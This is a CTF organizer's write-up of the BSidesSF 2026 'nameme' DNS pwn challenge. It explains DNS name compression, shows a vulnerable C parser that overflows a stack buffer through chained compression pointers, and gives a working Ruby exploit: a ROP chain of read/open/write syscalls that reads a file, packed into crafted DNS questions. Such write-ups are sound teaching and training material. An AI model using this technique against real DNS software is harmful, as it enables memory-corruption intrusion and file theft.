---
title: 'BSidesSF 2026: nameme - a DNS-based pwn challenge'
author: ron
layout: post
categories:
- bsidessf-2026
- bsidessf
- ctfs
- pwn
- dns
---

This is a challenge I've been considering making forever. It's possible I've
already made it, even, it's one of those things that appeals to my brain!

As always, you can find copies of the binaries, containers, and full solution
in our [GitHub repo](https://github.com/BSidesSF/ctf-2026-release)!

<!--more-->

## DNS Compression

The important thing to realize is that DNS has a weird feature called
"compression". What that means is, a part of a DNS name in a DNS packet can
contain a reference to another name. So if you query `example.org`, you send
this request:

```
00000000  00 16 01 00 00 01 00 00  00 00 00 00 07 65 78 61   ........ .....exa
00000010  6d 70 6c 65 03 6f 72 67  00 00 01 00 01            mple.org .....
```

DNS requests are pretty straight forward:

* `0x0016` - transaction id (random)
* `0x0100` - flags
* `0x0001` / `0x0000` / `0x0000` / `0x0000` - one question is coming, and no answers/other records
* `\x07example\x03org\x00` - `example.org`, encoded with one-byte length prefixes instead of periods
* `0x0001` / `0x0001` - A record / INternet (or the other way around, I always forget)

The response is pretty similar:

```
00000000  00 16 81 80 00 01 00 02  00 00 00 00 07 65 78 61   ........ .....exa
00000010  6d 70 6c 65 03 6f 72 67  00 00 01 00 01 c0 0c 00   mple.org ........
00000020  01 00 01 00 00 00 89 00  04 68 12 03 18 c0 0c 00   ........ .h......
00000030  01 00 01 00 00 00 89 00  04 68 12 02 18            ........ .h...
```

The transaction and flags are the same.

The numbers of records is different: `0x0001` / `0x0002` / `0x0000` / `0x0000`
means there is one question and TWO answers now. The important takeaway is that
the response repeats the question back.

The question starts at 0x0c - `\x07example\x03org\x00`.

The first answer (after the `0x0001` / `0x0001`) starts with `0xc00c`. That's
gonna be the key!

`0xc...` means "look elsewhere in the packet", and `0x.00c` means "look at
offset 0x0c" - ie, the previous time `example.org` was used.

Basically, DNS packets have a feature that lets you look elsewhere in the packet.
Instead of 0xc00c, you can do `0xc015` and it'll reference `.org`.

NORMALLY, you don't see this sorta compression in client-to-server messages,
because they typically only carry a single question, but in MY server it's
allowed!

## The vulnerability

The client reads up to 1024 bytes from the UDP socket:

```c
  ssize_t size = read(fileno(stdin), buffer->buffer, BUFFER_SIZE);
```

When names are read, they're copied into a stack buffer:

```c
buffer->stored_read_pointer = NULL;
for(label = *buffer->read_pointer++; label; label = *buffer->read_pointer++) {
  // fprintf(stderr, "Label: 0x%02x (%d) @ %ld - %s\n", label, label, question_length, buffer->read_pointer - 1);
  // Pointer label
  if((label & 0xC0) == 0xC0) {
    uint16_t ptr = 0x3FFF & ((label << 8) | *buffer->read_pointer++);
    // fprintf(stderr, "Jumping to 0x%02x (%d)\n", ptr, ptr);

    // If this is the first pointer, keep track of where we started
    if(buffer->stored_read_pointer == NULL) {
      buffer->stored_read_pointer = buffer->read_pointer;
    }

    buffer->read_pointer = buffer->buffer + ptr;
  } else if(label > 0x7F) {
    fprintf(stderr, "Illegal label: 0x%02x\n", label);
    exit(1);
  } else {
    if((buffer->read_pointer + label) >= buffer->end) {
      return 0;
    }
    memcpy(question.name + question_length, buffer->read_pointer, label);

    buffer->read_pointer += label;
    question_length += label;

    // fprintf(stderr, "%p %ld\n", question.name, question_length);
    question.name[question_length++] = '.';
    question.name[question_length] = '\0';
  }
}
```

The `memcpy()` is problematic, because it's not checking bounds in a meaningful
way.

The trick is that the DNS question buffer is also 1024 bytes long:

```c
typedef struct {
  char name[BUFFER_SIZE];
  uint16_t type;
  uint16_t class;
} dns_question_t;
```

Which means you can't really overflow the buffer....... or can you?

Obviously I wouldn't have spent all that time talking about DNS compression
earlier if it didn't matter!

The trick is that compression can be used to kinda make a "spiral" of buffers
to make a string that's much, much longer than 1024 bytes!

## The exploit

Because of how DNS names are encoded, I had to do a bit of a weird ROP chain
to actually exploit this; occasionally we just need to "consume" bytes to avoid
hitting the `.` part of the name:

```ruby
data1 = [
  # ---- sys_read (to get the filename)
  POP_RDI_RET, 0,                            # fd = stdin
  POP_RSI_RET, EMPTY_MEMORY,                 # buffer
  POP_RDX_POP_RBX_RET,       64, 0x13371337, # count / unused (for rbx)
  POP_RAX_RET, 0,                            # 0 = sys_read
  SYSCALL_RET,                               # sys_read()

  # ---- sys_open
  POP_RDI_RET, EMPTY_MEMORY,                 # pathname

  # ...this gets us to data2...
  POP_POP_POP_RET, 0x3131313131313131,
]

data2 = [
  POP_RSI_RET, 0,                            # 0 = flags (O_RDONLY)
  POP_RAX_RET, 2,                            # 2 = sys_open
  SYSCALL_RET,                               # sys_open()

  # ---- sys_read
  POP_RDI_RET, 6,                            # fd = 6 (what it happens to be)
  POP_RSI_RET, EMPTY_MEMORY,                 # buffer = random memory
  POP_RDX_POP_RBX_RET, 64, 0x13371337,       # count / unused (for rbx)

  # ...this gets us to data3...
  POP_POP_POP_RET, 0x3232323232323232,
]

data3 = [
  POP_RAX_RET, 0,                            # 0 - sys_read
  SYSCALL_RET,                               # sys_read()

  # ---- sys_write
  POP_RDI_RET, 1,                            # fd = 1 = stdout
  POP_RSI_RET, EMPTY_MEMORY,                 # rsi = buffer
  POP_RDX_POP_RBX_RET, 64, 0x13371337,       # count + unused (for rbx)
  POP_RAX_RET, 1,                            # 1 = sys_write
  SYSCALL_RET,                               # sys_write()

```

Then I encode those into questions (see the comment for more details):

```ruby
# Encode the questions
#
# The \x78 is the real length of the question/segment - it correctly jumps to
# the \x00 at the end
#
# The \xc0\x0d is a "compression pointer" that pointers to the second byte of
# the first question (\x7D), which points to the same byte in the next question,
# and so on to the bottom
#
# The \x36AAAAAA... sequence is to slightly adjust the length to optimize how
# much ROP data we get
#
# The \xc0\x0e is another compression pointer; this one goes to the second \x7D
# in the first question, which jumps to the \x7d in the remaining questions
# until it hits the \x00 end ends. Starting around the end of the first question
# (on the third time through), it overflows the stack. The third time visiting
# the third question is where the return address lands (hence data1). From
# there, it's just some standard ROP code (except that we have to deal with
# limited lengths)
questions = [
  encode_question("\x78\x7D\x7Dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxabcdefgh\x00"),
  encode_question("\x78\x7D\x7D#{ data1.pack('Q*') }OOOOOO\x00"),
  encode_question("\x78\x7D\x7Dab#{ data2.pack('Q*') }CCCC\x00"),
  encode_question("\x78\x7D\x7Daaaa#{ data3.pack('Q*') }xxxxxxxxxx\x00"),
  encode_question("\x78\x7D\x00EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE\x00"),
  encode_question("\x78\x7DFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\x00"),
  encode_question("\x78\x7EGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG\x00"),
  encode_question("\xc0\x0d\x36AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc0\x0e")
]
```

Then I make it into a query:

```ruby
# Send a basic query
s.send([
  0x1234,
  0x0120,
  questions.length,
  0x0000,
  0x0000,
  0x0000,
].pack('nnnnnn') + questions.join, 0)
```

And that's that!
